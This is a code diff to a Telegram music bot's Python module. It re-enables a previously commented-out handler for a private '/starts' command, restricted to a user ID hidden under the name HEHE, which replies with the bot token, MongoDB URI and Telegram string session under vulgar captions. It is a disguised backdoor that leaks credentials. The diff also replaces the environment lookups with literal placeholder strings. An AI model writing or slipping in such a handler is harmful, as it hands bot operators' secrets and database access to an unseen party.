@@ -20,9 +20,9 @@ from VIPMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
 from VIPMUSIC.utils.formatters import alpha_to_int, get_readable_time
 from VIPMUSIC.mongo.afkdb import HEHE
 from config import BANNED_USERS, adminlist, lyrical
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
+BOT_TOKEN = "BOT_TOKEN"
+MONGO_DB_URI = "MONGO_DB_URI"
+STRING_SESSION = "STRING_SESSION"
 from dotenv import load_dotenv
 
 rel = {}
@@ -96,7 +96,7 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
-"""@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
+@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
 async def help(client: Client, message: Message):
    await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
@@ -111,7 +111,6 @@ async def close_menu(_, query: CallbackQuery):
         await umm.delete()
     except:
         pass
-"""
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
 @ActualAdminCB
